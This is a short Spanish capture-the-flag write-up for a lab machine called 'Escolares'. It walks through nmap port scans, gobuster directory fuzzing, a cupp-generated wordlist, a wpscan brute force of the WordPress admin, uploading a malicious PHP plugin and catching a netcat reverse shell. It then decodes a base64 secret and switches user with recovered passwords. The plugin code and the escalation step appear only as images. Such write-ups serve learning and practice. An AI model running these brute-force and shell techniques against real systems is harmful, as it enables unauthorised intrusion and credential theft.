### Maquina Escolares

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2 

![alt text](image.png)

## Entramos en la web

Encontramos lo siguiente:

<!-- INFORMACION PERSONAL ACADEMICO -->
<!-- /profesores.html -->

Entramos en la url /profesores.html

Encontramos un profesor que es administrador que tiene como usuario luisillo, tambien encontramos informacion de el, lo primero que se me ocurrio fue hacer fuerza bruta con hydra al puerto ssh con rockyou pero no funciona, entonces lo que hice fue utilizar cupp una herramienta que crea contraseñas a partir de informacion que le brindes.

![alt text](image-2.png)

clonamos cupp de https://github.com/Mebus/cupp

pyhton3 cupp.py -i -> me arrojo un luis.txt

## Fuzzing web

gobuster dir -t 200 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

/info.php             
/assets               
/wordpress           
/index.html           
/contacto.html       
/phpmyadmin          

Ahora fuzzing web a http://172.17.0.2/wordpress

gobuster dir -t 200 -u http://172.17.0.2/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

/wp-content           
/index.php            
/wp-login.php         
/license.txt          
/wp-includes          
/readme.html          
/wp-trackback.php     
/xmlrpc.php           

Fuerza bruta a wordpress con wpscan:

wpscan --url http://172.17.0.2/wordpress/wp-login.php --usernames luisillo --passwords luis.txt

![alt text](image-3.png)

## Intrusion

Ingresamos con las credenciales encontradas, en nuestro maquina atacante creamos un plugin para wordpress, dentro del plugin un codigo php malicioso, luego lo comprimimos con zip

![alt text](image-4.png)

nos ponemos en escucha con netcat y listo

![alt text](image-5.png)

entramos en /tmp y vemos un archivo oculto .secret.txt que decia:

cHJlbWl1bXBhc3N3b3Jk

con cybercheff la desciframos:

premiumpassword

En home encontramos el archivo secret.txt que contiene la contraseña de luisillo

luisillopasswordsecret

su luisillo -> luisillopasswordsecret

## Escalar privilegios

![alt text](image-6.png)





 
